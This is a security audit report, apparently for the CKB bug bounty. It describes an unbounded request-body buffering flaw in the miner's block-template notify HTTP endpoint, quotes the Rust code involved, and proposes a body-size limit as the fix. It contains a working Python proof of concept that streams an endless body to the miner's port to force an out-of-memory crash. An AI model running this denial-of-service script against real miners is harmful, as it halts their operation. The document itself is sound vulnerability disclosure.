The code confirms the claim exactly. The `handle` function at line 362 calls `BodyExt::collect(req).await?.aggregate()` with no size limit, and the grep for any limiting mechanism (`Limited`, `body_limit`, `max_body`, `BodyLimit`) in the entire `miner/` tree returns zero results. The `listen_block_template_notify` function sets up a plain `TcpListener` with no authentication or body-size middleware.

Audit Report

## Title
Unbounded HTTP Body Buffering in Miner Notify Endpoint Allows OOM Crash — (File: miner/src/client.rs)

## Summary
The miner's block-template notify HTTP server unconditionally buffers the entire incoming request body into heap memory with no size cap. Any process that can reach the TCP port can send an arbitrarily large body, causing the miner process to exhaust available memory and be killed by the OS OOM killer.

## Finding Description
`listen_block_template_notify` (L234–271) binds a plain `TcpListener` and spawns a connection handler for every accepted connection with no authentication, rate limiting, or body-size middleware. The sole HTTP handler `handle` (L358–369) calls `BodyExt::collect(req).await?.aggregate()` at L362, which streams and accumulates every byte of the incoming body into a contiguous in-memory buffer before any JSON parsing occurs. A grep for `Limited`, `body_limit`, `max_body`, or `BodyLimit` across the entire `miner/` tree returns zero results, confirming no guard exists anywhere in the call path.

## Impact Explanation
Crashing the miner process halts all mining activity. This matches the allowed CKB bounty impact: **Note (0–500 points) — Any local RPC API crash**. The miner is a separate process from the CKB node; the node itself is unaffected.

## Likelihood Explanation
If the notify address is `127.0.0.1`, any unprivileged local process can exploit it. If bound to `0.0.0.0`, any network peer can. No authentication, no rate limiting, and no body cap are present. A single HTTP POST with a multi-gigabyte `Content-Length` and a streaming body suffices. Zero privileges and zero cryptographic material are required.

## Recommendation
Wrap the incoming body with `http_body_util::Limited` before collecting:

```rust
use http_body_util::Limited;

const MAX_BODY: u64 = 4 * 1024 * 1024; // 4 MiB

async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let limited = Limited::new(req, MAX_BODY);
    let body = BodyExt::collect(limited).await?.aggregate();
    // ...
}
```

This causes `collect` to return an error (not a panic) once the limit is exceeded, and the connection is cleanly dropped.

## Proof of Concept
```bash
python3 -c "
import socket
s = socket.create_connection(('127.0.0.1', 18114))
header = (
    b'POST / HTTP/1.1\r\n'
    b'Host: 127.0.0.1\r\n'
    b'Content-Type: application/json\r\n'
    b'Content-Length: 2147483648\r\n'
    b'\r\n'
)
s.sendall(header)
chunk = b'A' * (1024 * 1024)
while True:
    s.sendall(chunk)
"
# Observe miner RSS grow unboundedly until OOM kill.
``` [1](#0-0) [2](#0-1)

### Citations

**File:** miner/src/client.rs (L234-261)
```rust
    async fn listen_block_template_notify(&self, addr: SocketAddr) {
        let listener = TcpListener::bind(addr).await.unwrap();
        let server = auto::Builder::new(TokioExecutor::new());
        let graceful = GracefulShutdown::new();
        let stop_rx: CancellationToken = new_tokio_exit_rx();

        loop {
            let client = self.clone();
            let handle = service_fn(move |req| handle(client.clone(), req));
            tokio::select! {
                conn = listener.accept() => {
                    let (stream, _) = match conn {
                        Ok(conn) => conn,
                        Err(e) => {
                            info!("accept error: {}", e);
                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                            continue;
                        }
                    };
                    let stream = hyper_util::rt::TokioIo::new(Box::pin(stream));
                    let conn = server.serve_connection_with_upgrades(stream, handle);

                    let conn = graceful.watch(conn.into_owned());
                    tokio::spawn(async move {
                        if let Err(err) = conn.await {
                            info!("connection error: {}", err);
                        }
                    });
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```
